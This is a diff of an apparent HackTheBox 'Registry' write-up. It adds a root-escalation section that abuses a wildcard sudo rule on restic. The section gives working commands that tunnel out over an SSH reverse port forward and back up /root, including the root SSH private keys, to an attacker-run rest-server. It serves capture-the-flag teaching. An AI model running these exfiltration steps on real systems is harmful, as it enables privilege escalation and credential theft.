@@ -5,7 +5,7 @@ categories:
   - HackTheBox
 tags: [docker, linux, nginx, restic, cms, webshell, ssh, reverse port forward, jtr, CVE-2019-9185, python, anti-csrf]
 toc: true
-toc_sticky: false
+toc_sticky: true
 toc_label: "Table of Awesome Content"
 toc_icon: "cog"
 ---
@@ -451,3 +451,21 @@ Running through basic enumeration with the PHP webshell, we find out that the `w
 
 The reason this is exploitable is the `sudo` command has a wildcard after "rest", which means we can insert *any* rest server as the backup target. So all we need to do is [set up our own rest server](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server) locally and send a command via our webshell to backup stuff to it.
 
+# Getting Root
+## Setting up a restic repo and server
+To [set up a local restic server](https://github.com/restic/rest-server), first initialize a rest repository with `restic init --repo ~/HTB/registry/restic`. Second, run the service against the repo with `rest-server --path ~/HTB/registry/restic --listen localhost:5678`. If we try to run `rest-server` before initializing the repo, it returns fatal errors.
+
+## Send data back to the local restic server
+Trying to use any kind of reverse connection from this box will fail if trying it normally because there is a block on outgoing connections. To get around that, use a SSH Reverse Port Forwarding Tunnel. We can use the command `ssh -R 4455:localhost:5678 bolt@registry.htb` to set it up.
+
+We can exfiltrate data with root permissions by using the `sudo restic` command. To exploit the command from the webshell, run `sudo /usr/bin/restic backup -r rest:http://localhost:4455/ -p /tmp/tmpf /root/root.txt`. What that does is send the backup to the forwarded port 4455, which is running on localhost from perspective of the remote box. The `-p /tmp/tmpf` refers to a file containing the password used for the repository when it was initialized. The password file will need to be created before running this command.
+
+## Retrieving the data from the restic repo FOR THE WIN!
+After that, we have to restore the data from the backup taken on the remote box to get the root flag. Use the command `restic -r rest:http://localhost:5678/ restore latest --target from-registry` to grab the root flag!
+
+## Alternative ending: root shell
+Getting the root flag is nice, but popping root shells is nicer! To do that on this box, replace the `/root/root.txt`  with just `/root/`. That way the backup will send the entire `root` home folder. Within the home folder, there is a `.ssh` folder with private keys!
+
+[![Root SSH](\Sidequests\assets\registry\2020-03-19_23h34_27.png)](\Sidequests\assets\registry\2020-03-19_23h34_27.png)
+
+# **~The end~**
